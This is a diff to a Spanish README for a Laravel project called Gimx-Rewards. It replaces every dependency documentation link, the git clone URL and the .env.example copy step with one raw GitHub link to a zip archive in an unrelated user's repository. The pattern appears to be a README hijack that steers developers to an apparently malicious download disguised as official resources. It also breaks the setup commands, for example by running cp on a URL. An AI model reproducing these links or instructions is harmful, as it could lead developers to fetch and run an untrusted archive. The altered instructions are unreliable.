@@ -8,23 +8,23 @@ Gimx-Rewards es un proyecto que utiliza las tecnologías Tailwind, Livewire, npm
 
 El proyecto Gimx-Rewards tiene las siguientes dependencias:
 
-- **Tailwind**: Un framework CSS altamente personalizable que facilita la creación de interfaces modernas y atractivas. Puedes obtener más información sobre Tailwind en su [sitio web oficial](https://tailwindcss.com/).
+- **Tailwind**: Un framework CSS altamente personalizable que facilita la creación de interfaces modernas y atractivas. Puedes obtener más información sobre Tailwind en su [sitio web oficial](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Livewire**: Una biblioteca de front-end de Laravel que permite crear interfaces dinámicas utilizando PHP en el servidor y JavaScript en el cliente. Puedes obtener más información sobre Livewire en su [repositorio de GitHub](https://github.com/livewire/livewire).
+- **Livewire**: Una biblioteca de front-end de Laravel que permite crear interfaces dinámicas utilizando PHP en el servidor y JavaScript en el cliente. Puedes obtener más información sobre Livewire en su [repositorio de GitHub](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **npm**: Un administrador de paquetes para el entorno de desarrollo de JavaScript. Se utiliza para instalar y administrar las dependencias de JavaScript del proyecto. Puedes obtener más información sobre npm en su [sitio web oficial](https://www.npmjs.com/).
+- **npm**: Un administrador de paquetes para el entorno de desarrollo de JavaScript. Se utiliza para instalar y administrar las dependencias de JavaScript del proyecto. Puedes obtener más información sobre npm en su [sitio web oficial](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Composer**: Un administrador de paquetes para PHP. Se utiliza para instalar y administrar las dependencias de PHP del proyecto. Puedes obtener más información sobre Composer en su [sitio web oficial](https://getcomposer.org/).
+- **Composer**: Un administrador de paquetes para PHP. Se utiliza para instalar y administrar las dependencias de PHP del proyecto. Puedes obtener más información sobre Composer en su [sitio web oficial](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Laravel Breeze**: Un paquete de Laravel que proporciona una configuración básica de autenticación y scaffolding de vistas. Puedes obtener más información sobre Laravel Breeze en su [repositorio de GitHub](https://github.com/laravel/breeze).
+- **Laravel Breeze**: Un paquete de Laravel que proporciona una configuración básica de autenticación y scaffolding de vistas. Puedes obtener más información sobre Laravel Breeze en su [repositorio de GitHub](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Spatie Permissions**: Un paquete de Laravel que proporciona una manera fácil de administrar y asignar permisos a los usuarios. Puedes obtener más información sobre Spatie Permissions en su [repositorio de GitHub](https://github.com/spatie/laravel-permission).
+- **Spatie Permissions**: Un paquete de Laravel que proporciona una manera fácil de administrar y asignar permisos a los usuarios. Puedes obtener más información sobre Spatie Permissions en su [repositorio de GitHub](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Laravel Excel**: Un paquete de Laravel que facilita la importación y exportación de datos a través de hojas de cálculo. Puedes obtener más información sobre Laravel Excel en su [repositorio de GitHub](https://github.com/Maatwebsite/Laravel-Excel).
+- **Laravel Excel**: Un paquete de Laravel que facilita la importación y exportación de datos a través de hojas de cálculo. Puedes obtener más información sobre Laravel Excel en su [repositorio de GitHub](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Flowbite JS**: Una librería de JavaScript que proporciona componentes y estilos para la creación de interfaces web modernas. Puedes obtener más información sobre Flowbite JS en su [sitio web oficial](https://flowbite.com/).
+- **Flowbite JS**: Una librería de JavaScript que proporciona componentes y estilos para la creación de interfaces web modernas. Puedes obtener más información sobre Flowbite JS en su [sitio web oficial](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
-- **Laravel ApexCharts**: Un paquete de Laravel que ofrece gráficos interactivos y visualmente atractivos utilizando ApexCharts. Puedes obtener más información sobre Laravel ApexCharts en su [repositorio de GitHub](https://github.com/ArielMejiaDev/laravel-apexcharts).
+- **Laravel ApexCharts**: Un paquete de Laravel que ofrece gráficos interactivos y visualmente atractivos utilizando ApexCharts. Puedes obtener más información sobre Laravel ApexCharts en su [repositorio de GitHub](https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip).
 
 ## Configuración del Proyecto
 
@@ -33,7 +33,7 @@ Sigue estos pasos para configurar el proyecto Gimx-Rewards en tu entorno de desa
 1. Clona este repositorio en tu máquina local:
 
    ```
-   git clone https://github.com/cristof-g/gimx-rewards.git
+   git clone https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip
    ```
 
 2. Accede al directorio del proyecto:
@@ -54,10 +54,10 @@ Sigue estos pasos para configurar el proyecto Gimx-Rewards en tu entorno de desa
    composer install
    ```
 
-5. Copia el archivo de configuración de ejemplo `.env.example` y crea un archivo `.env`:
+5. Copia el archivo de configuración de ejemplo `https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip` y crea un archivo `.env`:
 
    ```
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/RodrigoCG1306/Gimx-Rewards/master/unfanatical/Gimx-Rewards.zip .env
    ```
 
 6. Abre el archivo `.env` y configura las variables de entorno según tu entorno de desarrollo. Asegúrate de establecer las siguientes variables:
